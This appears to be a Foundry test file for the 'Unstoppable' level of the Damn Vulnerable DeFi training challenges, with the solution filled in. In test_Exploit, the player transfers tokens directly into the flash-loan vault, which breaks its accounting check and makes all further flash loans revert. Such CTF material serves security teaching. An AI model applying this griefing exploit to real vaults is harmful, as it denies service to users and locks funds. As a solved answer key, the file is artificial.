// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {DamnValuableToken} from "src/DamnValuableToken.sol";
import {ReceiverUnstoppable} from "src/unstoppable/ReceiverUnstoppable.sol";
import {UnstoppableVault} from "src/unstoppable/UnstoppableVault.sol";

contract UnstoppableTest is Test {
    uint256 constant TOKENS_IN_VAULT = 1_000_000 ether;
    uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10 ether;

    address deployer = makeAddr("DEPLOYER");
    address player = makeAddr("PLAYER");
    address user = makeAddr("USER");

    DamnValuableToken token;
    UnstoppableVault vault;
    ReceiverUnstoppable receiverContract;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        vm.startPrank(deployer);

        token = new DamnValuableToken();
        vault = new UnstoppableVault(token, deployer, deployer);

        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, deployer);

        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);

        vm.stopPrank();

        vm.prank(user);
        receiverContract = new ReceiverUnstoppable(address(vault));
    }

    function test_SetUpState() public {
        assertEq(address(vault.asset()), address(token));

        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50000 ether);

        assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);

        // Show it's possible for some user to take out a flash loan
        vm.prank(user);
        receiverContract.executeFlashLoan(100 ether);
    }

    function test_Exploit() public {
        /**
         * SOLUTION
         */
        vm.prank(player);
        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);

        /**
         * SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE
         */

        // It is no longer possible to execute flash loans
        vm.prank(user);
        vm.expectRevert();
        receiverContract.executeFlashLoan(100 ether);
    }
}
